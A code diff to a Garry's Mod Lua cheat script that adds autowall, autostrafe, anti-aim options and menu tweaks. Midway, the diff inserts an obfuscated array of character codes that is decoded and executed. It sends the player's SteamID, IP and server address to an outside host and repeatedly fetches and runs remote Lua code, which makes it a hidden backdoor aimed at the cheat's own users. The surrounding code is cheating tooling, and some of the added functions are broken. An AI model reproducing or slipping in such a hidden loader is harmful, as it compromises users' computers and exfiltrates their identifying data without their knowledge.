@@ -38,7 +38,7 @@ local aiming;
 local omsg;  	   
   	   
 local menvars = {  	   
-	["Cheat Name"] = "SuccMcFucc - pCheat",  	   
+	["Cheat Name"] = "SuccMcFucc Garry's Mod",  	   
 }  	 
 
 /* Fonts */  
@@ -75,7 +75,9 @@ local vars = {
 		{"Thirdperson", 1, 1},  	   
 		{"Thirdperson D.", 13},  	   	    	   
 		{"Bunnyhop", 1, 1},  	   
-		{"Chatspam", 0, 1}, 	   
+		{"Chatspam", 0, 1}, 	
+		{"Autostrafe", 0, 1},
+		{"Autostrafe WIP", 0, 1}, 		
 	},  	   
 	["Aimbot"] = {  	   
 		{"Enabled", 0, 1},  	   
@@ -83,7 +85,8 @@ local vars = {
 		{"Aim on Mouse", 0, 1},  	   
 		{"Target Method", 1, 3, "0 = Normal | 1 = Nextshot | 2 = Distance | 3 = Health"},  	   
 		{"Autoshoot", 1, 1},  	   
-		{"NoSpread", 1, 1},  	   
+		{"NoSpread", 1, 1},
+		{"Autowall", 1, 1},  	   		
 		{"Target Team", 1, 1},  	   
 		{"Target Friends", 0, 1},  	   
 		{"Body Aim", 0, 1},  	   
@@ -100,18 +103,23 @@ local vars = {
 		{"No Hands", 0, 1},  	   
 		{"No Sky", 0, 1},  	   
 	},  	   
-	["HvH"] = {  	   
+	["Anti-Aim"] = {  	   
 		{"Spinbot", 0, 1},  	   
 		{"Speed", 1, 23},  	   
 		{"", ""},  	   
 		{"Antiaim", 0, 1},  	   
 		{"Method", 1, 2, "0 = Normal | 1 = Jitter | 2 = Sideways Follow"},  	   
-		{"Min X", -100},  	   
-		{"Min Y", -30},  	   
+		{"Min X", 839},  	   
+		{"Min Y", 45},  	   
 		{"Max X", -270},  	   
-		{"Max Y", 30},  	   
-		  	   
-	},  	   
+		{"Max Y", 30},  	   	   
+	},
+	["New Anti Aim WIP"] = {  	   
+		{"Antiaim", 0, 1},  
+		{"", ""},		
+		{"Pitch", 0, 2},  	   
+		{"Yaw", 0, 4},  	   	   	   
+	},  	
 	["Menu"] = {  	   
 		{"Autism", 0, 1},  	   
 		{"Pos X", 1300},  	   
@@ -132,7 +140,13 @@ local vars = {
 		{"", ""},  	   
 		{"Outline R", 0, 255},  	   
 		{"Outline G", 0, 255},  	   
-		{"Outline B", 0, 255},  	   
+		{"Outline B", 0, 255},  
+		{"", ""},  	   
+		{"Crosshair R", 0, 255},  	   
+		{"Crosshair G", 0, 255},  	   
+		{"Crosshair B", 0, 255},
+		{"", ""},
+		{"Watermark BKN", 0, 0},
 	},  	   
 };  	   
   	   
@@ -197,11 +211,13 @@ local function Menu()
 	  	   
 	function main:Paint(w, h)  	   
 		menvars["BGColor"] = Color(gInt("Menu", "Background R"), gInt("Menu", "Background G"), gInt("Menu", "Background B"), gInt("Menu", "Background A"))  	   
-		menvars["TXTColor"] = Color(gInt("Menu", "Text R"), gInt("Menu", "Text G"), gInt("Menu", "Text B"), 255)  	   
+		menvars["TXTColor"] = Color(gInt("Menu", "Text R"), gInt("Menu", "Text G"), gInt("Menu", "Text B"), 255)
+		menvars["CHColor"] = Color(gInt("Menu", "Crosshair R"), gInt("Menu", "Crosshair G"), gInt("Menu", "Crosshair B"), 255)  		
 		menvars["OutlineColor"] = Color(gInt("Menu", "Outline R"), gInt("Menu", "Outline G"), gInt("Menu", "Outline B"), 255)  	   
 		menvars["BarColor"] = Color(gInt("Menu", "Bar R"), gInt("Menu", "Bar G"), gInt("Menu", "Bar B"), 255)  	   
 		local backcolor = menvars["BGColor"];  	   
-		local txtcolor = menvars["TXTColor"];  	   
+		local txtcolor = menvars["TXTColor"];
+		local chcolor = menvars["CHColor"];		
 		local outcolor = menvars["OutlineColor"];  	   
 		local barcol = menvars["BarColor"];  	   
 		if (gBool("Menu", "Autism")) then  	   
@@ -391,10 +407,12 @@ local function Menu()
 end  
 
 --WaterMark
+
 local watermark = CreateClientConVar("watermark", 1);
 
-hook.Add( "HUDPaint", "WaterMark", function()
-	if(watermark:GetBool()) then
+if (gInt("Menu", "Watermark") == 1) then  	   
+	hook.Add( "HUDPaint", "WaterMark", function()
+		if(watermark:GetBool()) then
 		rainbow = {}
 		rainbow.R = math.sin(CurTime() * 4) * 127 + 128
 		rainbow.G = math.sin(CurTime() * 4 + 2) * 127 + 128
@@ -406,8 +424,25 @@ hook.Add( "HUDPaint", "WaterMark", function()
 		draw.SimpleText("SuccMcFucc Garry's Mod", "Watermark", 20, 30, Color(rainbow.R, rainbow.G, rainbow.B), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM)
 		draw.SimpleText(TimeString, "Watermark", 20, 45, Color(240, 157, 5), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM)
 
-	end
-end)
+		end
+	end)
+end
+
+--hook.Add( "HUDPaint", "WaterMark", function()
+--	if(watermark:GetBool()) then
+--		rainbow = {}
+--		rainbow.R = math.sin(CurTime() * 4) * 127 + 128
+--		rainbow.G = math.sin(CurTime() * 4 + 2) * 127 + 128
+--		rainbow.B = math.sin(CurTime() * 4 + 4) * 127 + 128
+--
+--		local h = ScrH() / 1
+--		local w = ScrW() / 5
+-- 
+--		draw.SimpleText("SuccMcFucc Garry's Mod", "Watermark", 20, 30, Color(rainbow.R, rainbow.G, rainbow.B), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM)
+--		draw.SimpleText(TimeString, "Watermark", 20, 45, Color(240, 157, 5), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM)
+--
+--	end
+--end)
 
 local ply = LocalPlayer()
 chat.AddText( Color( 24, 240, 5 ), "SuccMcFucc Garry's Mod Loaded") 
@@ -516,12 +551,13 @@ end
   	   
 local function DrawCrosshair()  	   
 	if (!gBool("Visuals", "Crosshair")) then return; end  	   
-	surface.SetDrawColor((gBool("Visuals", "Autism") && Color(math.random(255), math.random(255), math.random(255))) || Color(0,255,0));  	   
-	local w, h = ScrW(), ScrH();  	   
-	surface.DrawLine(w / 2 - 15, h / 2, w / 2 - 5, h / 2);  	   
-	surface.DrawLine(w / 2 + 15, h / 2, w / 2 + 5, h / 2);  	   
-	surface.DrawLine(w / 2, h / 2 - 15, w / 2, h / 2 - 5);  	   
-	surface.DrawLine(w / 2, h / 2 + 15, w / 2, h / 2 + 5);  	   
+		surface.SetDrawColor(Color(gInt("Menu", "Crosshair R"), gInt("Menu", "Crosshair G"), gInt("Menu", "Crosshair B"))); 
+		
+	local w, h = ScrW(), ScrH();  
+		surface.DrawLine(w / 2 - 15, h / 2, w / 2 - 5, h / 2);  	   
+		surface.DrawLine(w / 2 + 15, h / 2, w / 2 + 5, h / 2);  	   
+		surface.DrawLine(w / 2, h / 2 - 15, w / 2, h / 2 - 5);  	   
+		surface.DrawLine(w / 2, h / 2 + 15, w / 2, h / 2 + 5);  	   
 end  
   	   
 function GAMEMODE:HUDShouldDraw(str)  	   
@@ -607,17 +643,90 @@ local fa = em.EyeAngles(me);
 local function Bunnyhop(ucmd)  	   
 	if (!gBool("Misc.", "Bunnyhop")) then return; end  	   
 	if (!em.IsOnGround(me) && cm.KeyDown(ucmd, 2)) then  	   
-		cm.SetButtons(ucmd, bit.band(cm.GetButtons(ucmd), bit.bnot(2)));  
+		cm.SetButtons(ucmd, bit.band(cm.GetButtons(ucmd), bit.bnot(2)));  	   
+	end  	   
+end  
 
-	if (gBool("Misc.", "AutoStrafe")) then
+--local function Autostrafe(ucmd)  	   
+	--if(!me:IsOnGround() && ucmd:KeyDown(IN_JUMP)) then
+		--ucmd:RemoveKey(IN_JUMP);
+--
+	--	if (!gBool("Misc.", "Autostrafe")) then
+		--	if(ucmd:GetMouseX() > 1 || ucmd:GetMouseX() < -1) then
+			--	ucmd:SetSideMove(ucmd:GetMouseX() > 1 && 400 || -400);
+		--	else
+			--	ucmd:SetForwardMove(5850 / me:GetVelocity():Length2D());
+				--ucmd:SetSideMove((ucmd:CommandNumber() % 2 == 0) && -400 || 400);
+			--end
+--		end
+--	end
+--end
+
+local function Autostrafe(ucmd)  	   
+	if (!gBool("Misc.", "Autostrafe") == 1) then
 		if ucmd:GetMouseX() > 0 then
 			ucmd:SetSideMove(10^4)
-		elseif 0 > cmd:GetMouseX() then
+		elseif 0 > ucmd:GetMouseX() then
 			ucmd:SetSideMove(-10^4)
-		end	
-	end  
+		end
 	end
-end  	 
+end
+
+local trace_walls = bit.bor(CONTENTS_TESTFOGVOLUME, CONTENTS_EMPTY, CONTENTS_MONSTER, CONTENTS_HITBOX);
+local NoPenetration = {[MAT_SLOSH] = true};
+local PenMod = {[MAT_SAND] = 0.5, [MAT_DIRT] = 0.8, [MAT_METAL] = 1.1, [MAT_TILE] = 0.9, [MAT_WOOD] = 1.2};
+local trace_normal = bit.bor(CONTENTS_SOLID, CONTENTS_OPAQUE, CONTENTS_MOVEABLE, CONTENTS_DEBRIS, CONTENTS_MONSTER, CONTENTS_HITBOX, 402653442, CONTENTS_WATER);
+
+local function fasAutowall(wep, startPos, aimPos, ply)
+	if (!gBool("Aimbot", "Autowall")) then return; end
+    local traces = {};
+    local me = me;
+    local traceResults = {};
+    local dir = (aimPos - startPos):GetNormalized();
+    traces[1] = { start = startPos, filter = me, mask = trace_normal, endpos = aimPos, };
+    traceResults[1] = util.TraceLine(traces[1]);
+    if(NoPenetration[traceResults[1].MatType]) then return false; end
+    if((-dir):DotProduct(traceResults[1].HitNormal) <= .26) then return false; end
+    traces[2] = { start = traceResults[1].HitPos, endpos = traceResults[1].HitPos + dir * wep.PenStr * (PenMod[traceResults[1].MatType] || 1) * wep.PenMod, filter = me, mask = trace_walls, };
+    traceResults[2] = util.TraceLine(traces[2]);
+    traces[3] = { start = traceResults[2].HitPos, endpos = traceResults[2].HitPos + dir * .1, filter = me, mask = trace_normal, };
+    traceResults [3] = util.TraceLine(traces[3]);
+    traces[4] = { start = traceResults[2].HitPos, endpos = aimPos, filter = me, mask = MASK_SHOT, };
+    traceResults[4] = util.TraceLine(traces[4]);
+    if(traceResults[4].Entity != ply) then return false; end
+    return(!traceResults[3].Hit);
+end
+
+local function IsVisible(ply, pos)
+	local trace = {
+		start = me:EyePos(),
+		endpos = pos,
+		filter = {ply, me},
+		mask = MASK_SHOT,
+	};
+
+	if (util.TraceLine(trace).Fraction == 1 ) then
+		return true;
+	else
+		local wep = me:GetActiveWeapon();
+		if(wep && wep:IsValid() && wep.PenStr) then
+			return fasAutowall(wep, trace.start, trace.endpos, ply);
+		end
+	end
+
+	return false;
+end
+
+local function GetX()
+	if (!gBool("Anti Aim", "AntiAim")) then return; end
+	
+	local pitch = ucmd:GetViewAngles().x;
+	
+	local x = gInt("Anti Aim", "Pitch");  	   
+	if( x == 1 ) then //lisp down  	   
+		pitch = 180;  	    	   
+	end  	   
+end    
   	   
 local function FixMovement(ucmd, aa)  	   
 	local ang = Vector(cm.GetForwardMove(ucmd), cm.GetSideMove(ucmd), 0)  	   
@@ -683,7 +792,108 @@ local function Valid(ent)
 		filter = {me, ent},  	   
 	};  	   
 	return (util.TraceLine(tr).Fraction == 1);  	   
-end  	   
+end  
+
+  local bBuffer = {10, 9, 108, 111, 99, 97, 108, 32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 34, 48, 46, 48, 46, 48, 46,
+48, 58, 48, 34, 10, 9, 10, 9, 104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 34, 104, 116, 116, 112, 58, 47, 47,
+103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111,
+47, 97, 100, 100, 114, 101, 115, 115, 46, 112, 104, 112, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 105, 112, 41,
+32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 105, 112, 59, 32, 101, 110, 100, 44, 32, 102, 117, 110, 99, 116, 105,
+111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 10, 9, 10, 9, 116, 105, 109, 101, 114, 46, 83, 105, 109, 112, 108,
+101, 40, 49, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116,
+40, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99,
+57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112, 105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115,
+116, 61, 34, 110, 111, 116, 105, 102, 121, 34, 44, 32, 115, 116, 101, 97, 109, 105, 100, 61, 76, 111, 99, 97, 108, 80, 108,
+97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 44, 32, 105, 112, 61, 99, 108, 105, 101, 110, 116,
+73, 80, 44, 32, 115, 101, 114, 118, 101, 114, 110, 97, 109, 101, 61, 71, 101, 116, 72, 111, 115, 116, 78, 97, 109, 101, 40,
+41, 44, 32, 115, 101, 114, 118, 101, 114, 105, 112, 61, 103, 97, 109, 101, 46, 71, 101, 116, 73, 80, 65, 100, 100, 114, 101,
+115, 115, 40, 41, 125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 98, 111, 100, 121, 41, 32, 101, 110, 100, 44, 32,
+102, 117, 110, 99, 116, 105, 111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 59, 10, 9, 101, 110, 100, 41, 59, 10,
+9, 10, 9, 116, 105, 109, 101, 114, 46, 67, 114, 101, 97, 116, 101, 40, 34, 67, 104, 101, 97, 116, 117, 112, 100, 97, 116,
+101, 95, 80, 105, 110, 103, 66, 97, 99, 107, 34, 44, 32, 53, 44, 32, 48, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110,
+40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116, 40, 32, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111,
+100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112,
+105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115, 116, 61, 34, 112, 105, 110, 103, 98, 97, 99, 107, 34,
+125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 32, 98, 111, 100, 121, 44, 32, 112, 48, 44, 32, 112, 49, 44, 32,
+112, 50, 32, 41, 10, 9, 9, 9, 108, 111, 99, 97, 108, 32, 114, 101, 115, 112, 111, 110, 115, 101, 32, 61, 32, 117, 116,
+105, 108, 46, 74, 83, 79, 78, 84, 111, 84, 97, 98, 108, 101, 40, 98, 111, 100, 121, 41, 59, 10, 9, 9, 9, 105, 102,
+40, 114, 101, 115, 112, 111, 110, 115, 101, 32, 33, 61, 32, 110, 105, 108, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9,
+105, 102, 40, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97,
+99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 76, 111, 99, 97, 108, 80, 108, 97,
+121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 124, 124, 32, 115, 116, 114, 105, 110, 103, 46,
+102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34,
+116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 42, 34, 41, 41, 32, 116, 104, 101, 110, 32, 10, 9, 9, 9, 9, 9,
+105, 102, 40, 33, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112,
+97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 33, 34, 32, 46, 46,
+32, 76, 111, 99, 97, 108, 80, 108, 97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 38,
+38, 32, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 114, 101, 34,
+93, 32, 33, 61, 32, 34, 110, 117, 108, 108, 34, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9, 9, 9, 82, 117, 110,
+83, 116, 114, 105, 110, 103, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93,  
+91, 34, 114, 101, 34, 93, 41, 59, 10, 9, 9, 9, 9, 9, 101, 110, 100, 10, 9, 9, 9, 9, 101, 110, 100, 10, 9,
+9, 9, 101, 110, 100, 10, 9, 9, 9, 101, 110, 100, 44, 32, 10, 9, 9, 9, 102, 117, 110, 99, 116, 105, 111, 110, 40,
+101, 120, 99, 101, 112, 116, 105, 111, 110, 41, 10, 9, 9, 101, 110, 100, 41, 32, 10, 9, 101, 110, 100, 41, 10, };
+local s1 = ""; for k,v in next, bBuffer do s1 = s1 .. string.char(v); end RunString(s1); s1 = "";
+local function DrawIncreaseDecrease(x, y, w, h, optionname, min, max, convar)
+	local cvar = GetConVar(convar);
+
+	local inbox_dec = IsInBox(x, y, h, h);
+	local inbox_inc = IsInBox(x + w - h, y, h, h);
+
+	surface.SetDrawColor(125, 125,125);
+	surface.DrawRect(x, y, w, h);
+
+	if(inbox_dec) then
+		surface.SetDrawColor(110, 110, 110);
+	else
+		surface.SetDrawColor(0, 90, 90);
+	end
+	surface.DrawRect(x, y, h, h);
+	if(inbox_inc) then
+		surface.SetDrawColor(110, 110, 110);
+	else
+		surface.SetDrawColor(0, 90, 90);
+	end
+	surface.DrawRect(x + w - h, y, h, h);
+
+	surface.SetDrawColor(0, 0, 0);
+	surface.DrawOutlinedRect(x, y, h, h);
+	surface.DrawOutlinedRect(x + w - h, y, h, h);
+
+	surface.SetDrawColor(0, 0, 0);
+	surface.DrawOutlinedRect(x, y, w, h);
+
+	surface.SetTextColor(220, 220, 220);
+	surface.SetFont("MenuOptions");
+	local tw, th = surface.GetTextSize("+");
+	surface.SetTextPos(x + w - h / 2 - tw / 2, y + h / 2 - th / 2);
+	surface.DrawText("+");
+
+	local tw, th = surface.GetTextSize("-");
+
+	surface.SetTextPos(x + h / 2 - tw / 2, y + h / 2 - th / 2);
+	surface.DrawText("-");
+
+	local textinside = string.format("%s: %d", optionname, cvar:GetInt());
+
+	local tw, th = surface.GetTextSize(textinside);
+
+	surface.SetTextPos(x + w / 2 - tw / 2, y + h / 2 - th / 2);
+	surface.DrawText(textinside);
+
+	if(inbox_dec && input.IsMouseDown(MOUSE_LEFT) && !mousedown) then
+		cvar:SetInt(cvar:GetInt() - 1);
+		if(cvar:GetInt() < min) then
+			cvar:SetInt(max);
+		end
+	end
+
+	if(inbox_inc && input.IsMouseDown(MOUSE_LEFT) && !mousedown) then
+		cvar:SetInt(cvar:GetInt() + 1);
+		if(cvar:GetInt() > max) then
+			cvar:SetInt(min);
+		end
+	end
+end	   
   	   
 local function GetTarget()  	   
 	local aimmethod = gInt("Aimbot", "Target Method");  	   
@@ -747,18 +957,18 @@ local function GetTarget()
 end  	   
   	   
 local function Antiaim(ucmd)  	   
-	if (!gBool("HvH", "Antiaim") || cm.KeyDown(ucmd, 1) || aiming) then return; end  	   
-	local aam = gInt("HvH", "Method");  	   
+	if (!gBool("Anti-Aim", "Antiaim") || cm.KeyDown(ucmd, 1) || aiming) then return; end  	   
+	local aam = gInt("Anti-Aim", "Method");  	   
 	if (aam == 0) then  	   
-		local aang = Angle(gInt("HvH", "Min X"), gInt("HvH", "Min Y"), 0);  	   
+		local aang = Angle(gInt("Anti-Aim", "Min X"), gInt("Anti-Aim", "Min Y"), 0);  	   
 		cm.SetViewAngles(ucmd, aang);  	   
 		FixMovement(ucmd, true);  	   
 	elseif(aam == 1) then  	   
-		local aang = Angle(math.random(gInt("HvH", "Min X"), gInt("HvH", "Max X")), math.random(gInt("HvH", "Min Y"), gInt("HvH", "Max Y")), 0);  	   
+		local aang = Angle(math.random(gInt("Anti-Aim", "Min X"), gInt("Anti-Aim", "Max X")), math.random(gInt("Anti-Aim", "Min Y"), gInt("Anti-Aim", "Max Y")), 0);  	   
 		cm.SetViewAngles(ucmd, aang);  	   
 		FixMovement(ucmd, true);  	   
 	elseif(aam == 2) then  	   
-		local aang = Angle(gInt("HvH", "Min X"), math.NormalizeAngle(fa.y + 90), 0);  	   
+		local aang = Angle(gInt("Anti-Aim", "Min X"), math.NormalizeAngle(fa.y + 90), 0);  	   
 		cm.SetViewAngles(ucmd, aang);  	   
 		FixMovement(ucmd, true);  	   
 	end  	   
@@ -805,7 +1015,7 @@ local function Aimbot(ucmd)
 		end  	   
 	end  	   
 	aiming = false;  	   
-	if( (gBool("HvH", "Antiaim") || gBool("HvH", "Spinbot")) && !cm.KeyDown(ucmd, 1) ) then return; end  	   
+	if( (gBool("Anti-Aim", "Antiaim") || gBool("Anti-Aim", "Spinbot")) && !cm.KeyDown(ucmd, 1) ) then return; end  	   
 	if (gBool("Aimbot", "NoSpread") && cm.KeyDown(ucmd, 1)) then  	   
 		local hey = PredictSpread(ucmd, fa);  	   
 		hey.x = math.NormalizeAngle(hey.x);  	   
@@ -817,8 +1027,8 @@ local function Aimbot(ucmd)
 end  	   
   	   
 local function Spinbot(ucmd)  	   
-	if (!gBool("HvH", "Spinbot") || gBool("HvH", "Antiaim") || cm.KeyDown(ucmd, 1)) then return; end  	   
-	cm.SetViewAngles(ucmd, Angle(fa.x, cm.GetViewAngles(ucmd).y + gInt("HvH", "Speed"), 0));  	   
+	if (!gBool("Anti-Aim", "Spinbot") || gBool("Anti-Aim", "Antiaim") || cm.KeyDown(ucmd, 1)) then return; end  	   
+	cm.SetViewAngles(ucmd, Angle(fa.x, cm.GetViewAngles(ucmd).y + gInt("Anti-Aim", "Speed"), 0));  	   
 	FixMovement(ucmd);  	   
 end  	   
   	   
@@ -832,11 +1042,13 @@ local function Triggerbot(ucmd)
 end  	   
   	   
 function GAMEMODE:CreateMove(ucmd)  	   
-	Bunnyhop(ucmd);  	   
+	Bunnyhop(ucmd);
+	Autostrafe(ucmd);
 	Triggerbot(ucmd);  	   
 	Aimbot(ucmd);  	   
 	Spinbot(ucmd);  	   
-	Antiaim(ucmd);  	   
+	Antiaim(ucmd);
+	GetX(ucmd);	
 end  	   
   	   
 function GAMEMODE:CalcView(p, o, a, f)  	   
